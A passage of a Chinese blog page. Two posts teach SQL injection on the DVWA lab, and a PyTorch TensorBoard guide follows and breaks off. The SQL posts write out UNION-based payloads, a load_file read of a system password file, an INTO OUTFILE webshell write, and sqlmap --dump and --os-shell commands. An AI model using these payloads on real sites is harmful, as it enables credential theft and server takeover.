<h5 id="数字型检测"><a href="#数字型检测" class="headerlink" title="数字型检测"></a>数字型检测</h5><p>​    当输入变量的类型为数字类型时，可以使用and 1=1和and 1=2配合进行注入点类型进行检测:</p>
<blockquote>
<ol>
<li>Url 地址中输入 <code>http://xxx/abc.php?id= x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
<li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
</ol>
</blockquote>
<p>原因为:</p>
<blockquote>
<p>如果当前注入点类型为数字型，    </p>
<p>​    当输入 <code>and 1=1</code>时，后台执行 Sql 语句：<code>select * from &lt;表名&gt; where id = x and 1=1</code>,没有语法错误且逻辑判断为正确，所以返回正常。</p>
<p>​    当输入 <code>and 1=2</code>时，后台执行 Sql 语句：<code>select * from &lt;表名&gt; where id = x and 1=2</code>,没有语法错误但是逻辑判断为假，所以返回错误。</p>
<p>而如果该注入点类型为字符型，</p>
<p>​    当输入<code>and 1=1</code>和 <code>and 1=2</code>时，后台执行sql语句：<code>select * from &lt;表名&gt; where id=&#39;x and 1=1&#39;</code>和 <code>select * from &lt;表名&gt; where id=&#39;x and 1=1</code>,将and语句作为字符进行id匹配，应该都没有查询结果，与事实不符因此该注入点为数字型注入点。</p>
</blockquote>
<h5 id="字符型注入点检测"><a href="#字符型注入点检测" class="headerlink" title="字符型注入点检测"></a>字符型注入点检测</h5><p>当输入变量为字符型时，可以使用’’ and ‘1’=’1和 ‘ and ‘1’=’2配合进行注入点类型检测：</p>
<blockquote>
<p>1.Url 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面依旧运行正常，继续进行下一步。</p>
<p>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2&#39;</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</p>
</blockquote>
<p>原因与上面的数字型注入点检测原理类似，这里就不进行详细讲述了，感兴趣的读者可以自己尝试解释一下。</p>
<h4 id="2-当前表行数测试"><a href="#2-当前表行数测试" class="headerlink" title="2.当前表行数测试"></a>2.当前表行数测试</h4><p>​    这里之所以要进行数据表行数测试是因为后面使用union进行联合查询时，明确后面要进行合并查询的列数。</p>
<p>要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x order by 8</span><br></pre></td></tr></table></figure>
<p>下面为使用dvwa进行注入测试时的行数测试为例，当使用oder by 1和2时，页面正常显示</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试.png?raw=true" alt=""></p>
<p>当将数字升到3是，产生如下报错，因此我们可以知道该表中只有两行。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/列数测试2.png?raw=true" alt=""></p>
<h4 id="3-测试当前表中那些列有回显"><a href="#3-测试当前表中那些列有回显" class="headerlink" title="3.测试当前表中那些列有回显"></a>3.测试当前表中那些列有回显</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># and 1=2为了不展示本改进心跳查询的内容，只展示union进行联合查询的内容</span><br><span class="line"># 最后的#是为了闭合本来sql语句中后面的‘</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure>
<p>这里dvwa表中本身就只有两列数据全部在前台进行显示</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/展示列测试.png?raw=true" alt=""></p>
<h4 id="4-查询数据库名称"><a href="#4-查询数据库名称" class="headerlink" title="4.查询数据库名称"></a>4.查询数据库名称</h4><p>​    查询当前数据库名称我们可以直接使用数据库内置函数database()进行获取，利用该函数进行当前数据库名称获取的典型注入代码如下所示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里将database函数卸载第二个参数位置处，将在第二个参数展示的位置进行展示。也可以写在第一个参数位置</span><br><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,database()#</span><br></pre></td></tr></table></figure>
<p>​    这里获取到了mysql中存在着名为dvwa的数据库</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-数据库名称获取.png?raw=true" alt=""></p>
<h4 id="5-数据表名获取"><a href="#5-数据表名获取" class="headerlink" title="5.数据表名获取"></a>5.数据表名获取</h4><p>​     表名获取利用系统自带数据中（mysql中的information_schema）中的tables表中的内容进行获取。tables表中常用的字段如下表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据表</th>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>tables</td>
<td>table_schema</td>
<td>字段所属的数据库名</td>
</tr>
<tr>
<td>tables</td>
<td>table_name</td>
<td>字段所属的表名</td>
</tr>
</tbody>
</table>
</div>
<p>​    使用下面的语句进行表名探索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;#</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表名获取.png?raw=true" alt=""></p>
<h4 id="6-字段获取"><a href="#6-字段获取" class="headerlink" title="6.字段获取"></a>6.字段获取</h4><p>​    字段获取利用系统自带的数据库（mysql中的information_schema）中的columns表中内容进行获取。columns表中常用字段如下表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据表</th>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>columns</td>
<td>table_schema</td>
<td>字段所属的数据库名</td>
</tr>
<tr>
<td>columns</td>
<td>table_name</td>
<td>字段所属的表名</td>
</tr>
<tr>
<td>columns</td>
<td>column_name</td>
<td>字段名称</td>
</tr>
</tbody>
</table>
</div>
<p>​    使用下面语完成对指定表中的字段名称进行探索：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;#</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入-表中列名获取.png?raw=true" alt=""></p>
<p>​    从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。</p>
<h4 id="7-读取关键字段"><a href="#7-读取关键字段" class="headerlink" title="7.读取关键字段"></a>7.读取关键字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users #</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/手工注入——用户名密码获取.png?raw=true" alt=""></p>
<h3 id="4-文件的写入读取"><a href="#4-文件的写入读取" class="headerlink" title="4.文件的写入读取"></a>4.文件的写入读取</h3><p>​    除了上面的基本的注入步骤外，找到注入点后还可以直接利用sql注入漏洞进行进一步的文件相关操作，可以直接通过sql注入实现对文件的读取与写入，利用文件的写入功能实现webshell的上传、系统用户名密码获取等功能。</p>
<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>​    在具有文件写入权限时常常可以直接使用进行文件读取，读取到文件后可以xxx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1&apos; and 1=2 union select laod_file(&apos;/etc/password&apos;) #</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap文件读取.png?raw=true" alt=""></p>
<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>​    在具有文件写入权限时可以使用文件读取命令写入小马文件，获取shell。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=1 and 1=2 union select ’小马文件内容‘into outfile '文件目录+文件名'</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/sql注入——sqlmap6步注入法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/17/sql注入——sqlmap6步注入法/" itemprop="url">sql注入——sqlmap6步注入法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-17T18:43:43+08:00">
                2020-01-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在<a href="">下一篇文章中进行介绍</a>。</p>
<h3 id="sqlmap注入6步法"><a href="#sqlmap注入6步法" class="headerlink" title="sqlmap注入6步法"></a>sqlmap注入6步法</h3><p>​    首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常见的全部关键步骤。本文主要介绍使用sqlmap工具来进行sql注入的过程。</p>
<p><strong>1.判定是否存在注入点</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 对提供的网址进行注入点测试   </span><br><span class="line">sqlmap -u http://xxx/id=??? --batch</span><br><span class="line">	--batch:表示全部需要人机交互的部分采用默认选项进行选择</span><br><span class="line">	--cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数</span><br><span class="line">	--r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测2.png?raw=true" alt=""></p>
<p>输出结果：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测.png?raw=true" alt=""></p>
<p><strong>2.数据库名获取</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取数据库名称</span><br><span class="line">sqlmap -u "http://xxx/id=???"   --current-db --batch</span><br><span class="line">	--cunrrent-db：进行数据库探测选项</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据库探测2.png?raw=true" alt=""></p>
<p>输出结果：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据探测.png?raw=true" alt=""></p>
<p><strong>3.获取数据库中的表名</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取表名</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --tables --batch</span><br><span class="line">	-D：指定要探测数据库名称</span><br><span class="line">	--tables：进行表名探索选项</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测2.png?raw=true" alt=""></p>
<p>输出结果：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测.png?raw=true" alt=""></p>
<p><strong>4.对选定表的列名进行获取</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取表中字段名称</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --columns --batch</span><br><span class="line">	-D：指定要进行探索的表</span><br><span class="line">	-columns：进行字段名称探索选项</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测2.png?raw=true" alt=""></p>
<p>输出结果：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测.png?raw=true" alt=""></p>
<p><strong>5.探测用户名密码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取用户名和密码并保存到指定文件</span><br><span class="line">sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump</span><br><span class="line">	-C:指定选择的列名</span><br><span class="line">	--dump：将内容输出到文件</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取2.png?raw=true" alt=""></p>
<p>输出结果：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取.png?raw=true" alt=""></p>
<p><strong>6.获取shell</strong></p>
<p>​    os-shell只是一个辅助上传大马、小马的辅助shell，可以使用也可以直接利用数据库备份功能人工上传大、小马不进行这一步。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取os-shell</span><br><span class="line">sqlmap -u "http://xxx/id=???" --os-shell</span><br></pre></td></tr></table></figure>
<p>​    这里使用os-shell需要很高的权限才能成功使用。具体需要的权限包括：</p>
<blockquote>
<p>1.网站必须是root权限</p>
<p>2.了解网站的绝对路径  </p>
<p>3.GPC为off，php主动转义的功能关闭</p>
<p>4.secure_file_priv= 值为空</p>
</blockquote>
<p>​    使用sqlmap存在一种缓存机制，如果完成了一个网址的一个注入点的探测，下次再进行探测将直接使用上次探测的结果进行展示，而不是重新开始探测，因此有时候显示的结果并不是我们当下探测进型返回的，面对这种情况就加上选项。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--purge 清除之前的缓存日志</span><br></pre></td></tr></table></figure>
<p>​    本文中提到的是一个标准的简单环境的sql注获取方式，但是在实际环境中，进行sql注入还存在权限不足、不知道绝对路径等关键问题，这些问题将在[sql注入——getshell中的问题]中进行具体讲述。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/15/pytorch-tensorboard使用指南/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/15/pytorch-tensorboard使用指南/" itemprop="url">pytorch_tensorboard使用指南</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-15T11:03:07+08:00">
                2019-11-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    最近pytorch官网推出了对tensorboard支持，因此最近准备对其配置和使用做一个记录。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>​    要在使用pytorch时使用tensorboard进行可视化第一就是软件的安装，整个过程中最大的问题就是软件的兼容性的问题了，下面是我再使用过程中确定可兼容的版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python 3.x</span><br><span class="line">pytorch 1.1.0</span><br><span class="line">tensorboard 1.1.4</span><br></pre></td></tr></table></figure>
<p>​    兼容的基础软件安装完成后，在安装依赖包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tensorboard future jupyter</span><br></pre></td></tr></table></figure>
<p>​    安装成功后就可以直接在正常编写的pytorch程序中加入tensorboard相关的可视化代码，并运行。下面是测试代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义网络</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test_model</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Test_model, self).__init__()</span><br><span class="line">        self.layer = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">3</span>, <span class="number">256</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">256</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.layer(x)</span><br><span class="line"></span><br><span class="line">model = Test_model()</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter()</span><br><span class="line">writer.add_graph(model, input_to_model=torch.randn((<span class="number">3</span>,<span class="number">3</span>)))</span><br><span class="line">writer.add_scalar(tag=<span class="string">"test"</span>, scalar_value=torch.tensor(<span class="number">1</span>)</span><br><span class="line">                    , global_step=<span class="number">1</span>)</span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>
<p>​    运行成功后，就可以使用shell进入到项目的运行文件的目录,这是可以看到目录下产生了一个新的runs目录，里面就是运行上面代码产生出的可视化文件。在文件的目录中输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tensorboard --logdir=runs</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：这里输入命令的目录一定要为文件的运行目录，runs文件夹的外面。</p>
</blockquote>
<p>​    最后，按照提示在浏览器中打开<a href="https://link.zhihu.com/?target=http%3A//localhost%3A6006/" target="_blank" rel="noopener">http://localhost:6006</a>，显示如下网页，恭喜你成功了</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/tensorboard成功部署页面.png?raw=true" alt=""></p>
<h3 id="TensorBoard常用功能"><a href="#TensorBoard常用功能" class="headerlink" title="TensorBoard常用功能"></a>TensorBoard常用功能</h3><p>​    tensorBoard之所以如此受到算法开发和的热捧，是因为其只需要是使用很简单的接口，就可以在实现很复杂的可视化功能，可以我们更好的发现模型存在的各种问题，以及更好的解决问题，其核心功能包括：</p>
<blockquote>
<p>1.模型结构可视化</p>
<p>2.损失函数、准确率可视化</p>
<p>3.各层参数更新可视化</p>
</blockquote>
<p>在TensorBoard中提供了各种类型的数据向量化的接口，主要包括：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>pytorch生成函数</th>
<th>pytorch界面栏</th>
<th>显示内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>add_scalar</td>
<td>SCALARS</td>
<td>标量(scalar)数据随着迭代的进行的变化趋势。常用于损失函数和准确率的变化图生成</td>
</tr>
<tr>
<td>add_graph</td>
<td>GRAPHS</td>
<td>计算图生成。常用于模型结构的可视化</td>
</tr>
<tr>
<td>add_histogram</td>
<td>HISTOGRAMS</td>
<td>张量分布监控数据随着迭代的变化趋势。常用于各层参数的更新情况的观察</td>
</tr>
<tr>
<td>add_text</td>
<td>TEXT</td>
<td>观察文本向量在模型的迭代过程中的变化。</td>
</tr>
</tbody>
</table>
</div>
<p>​    下面将具体介绍使用各个生成函数如何常用的功能。</p>
<h4 id="1-模型结构可视化（add-scalae使用）"><a href="#1-模型结构可视化（add-scalae使用）" class="headerlink" title="1.模型结构可视化（add_scalae使用）"></a>1.模型结构可视化（add_scalae使用）</h4><p>​    模型结构可视化一般用于形象的观察模型的结构，包括模型的层级和各个层级之间的关系、各个层级之间的数据流动等，这里要使用的就是计算图可视化技术。</p>
<p>​    首先，无论使用TensorBoard的任何功能都要先生成一个SummaryWriter，是一个后续所有内容基础，对应了一个TensorBoard可视化文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummerWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的参数主要有三个</span></span><br><span class="line"><span class="comment"># log_dir 文件的生成位置,默认为runs</span></span><br><span class="line"><span class="comment"># commment 生成文件内容的描述，最后会被添加在文件的结尾</span></span><br><span class="line">writer = SummaryWriter(logdir=<span class="string">"xxx"</span>,commit=<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>
<p>​    然后正常声明模型结构。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test_model</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Test_model, self).__init__()</span><br><span class="line">        self.layer = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">3</span>, <span class="number">256</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">256</span>, <span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.layer(x)</span><br></pre></td></tr></table></figure>
<p>​    在<strong>前面创建的writer基础上增加graph</strong>，实现模型结构可视化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">model = Test_Model()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见参数</span></span><br><span class="line"><span class="comment"># model 要进行可视化的模型</span></span><br><span class="line"><span class="comment"># input_to_model 要输入到模型中进行结构和速度测试的测试数据</span></span><br><span class="line">writer.add_graph(model,torch.Tensor([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># writer关闭</span></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：模型结构和各层速度的测试是在模型的正常训练过程中使用，而是在模型结构定义好以后，使用一些随机自定义数据进行结构可视化和速度测试的。</p>
</blockquote>
<p>​    最终在TensorBoard的GRAPHS中可以看到模型结构(<strong>点击查看具体的模型结构和各个结构所内存和消耗时间</strong>)</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/tensorboard成功部署页面.png?raw=true" alt="tensorboard成功部署页面.png" style="zoom:55%;"></p>
<h4 id="2-损失函数准确率可视化"><a href="#2-损失函数准确率可视化" class="headerlink" title="2.损失函数准确率可视化"></a>2.损失函数准确率可视化</h4><p>​    损失函数和准确率更新的可视化主要用于模型的训练过程中观察模型是否正确的在被运行，是否在产生了过拟合等意外情况，这里主要用到的是scalar可视化。</p>
<p>​    损失函数和准确率的可视化主要用在训练部分，因此假设模型的声明已经完成，然后进行后续的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将模型置于训练模式</span></span><br><span class="line">model.train()</span><br><span class="line">output = model(input_data)</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(comment=<span class="string">'测试文件'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准的训练</span></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    output_data = model(input_data)</span><br><span class="line">    loss = F.cross_entropy(output_data,label)</span><br><span class="line">    pred = output_data.data.max(<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    acc = pred.eq(label).sum()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在每一轮的训练中都进行acc和loss记录，写入tensrboard日志文件</span></span><br><span class="line">    writer.add_scalar(tag=<span class="string">'acc'</span>,scalar_value=acc,global_step=epoch)</span><br><span class="line">    writer.add_scalar(tag=<span class="string">"loss"</span>, scalar_value=loss,global_step=epoch)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 关闭tensorboard写入器</span></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>
<p>​    最终效果如下图。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/tensorboard损失函数、准确率迭代图.png?raw=True alt=" alt=" tensorboard损失函数、准确率迭代图.png" title="tensorboard成功部署页面.png&quot; style=&quot;zoom:25%; " style="zoom:45%;"></p>
<h4 id="3-各层参数更新可视化"><a href="#3-各层参数更新可视化" class="headerlink" title="3.各层参数更新可视化"></a>3.各层参数更新可视化</h4><p>​    各层参数可视化，是发现问题和模型调整的重要依据，我们<strong>常常可以根据再训练过程中模型各层的输出和各层再反向传播时的梯度来进行是否存在梯度消失现象</strong>，具体的使用可以参照文章<a href="https://www.toutiao.com/i6759006512414228995/?tt_from=weixin&amp;utm_campaign=client_share&amp;wxshare_count=1&amp;timestamp=1573973465&amp;app=news_article&amp;utm_source=weixin&amp;utm_medium=toutiao_android&amp;req_id=20191117145104010020047015100AB118&amp;group_id=6759006512414228995" target="_blank" rel="noopener">如何发现将死的ReLu</a>。</p>
<p>​    下面我们来具体讲解如何进行各层参数、输出、以及梯度进行可视化。这里用的主要是add_histgram函数来进行可视化。</p>
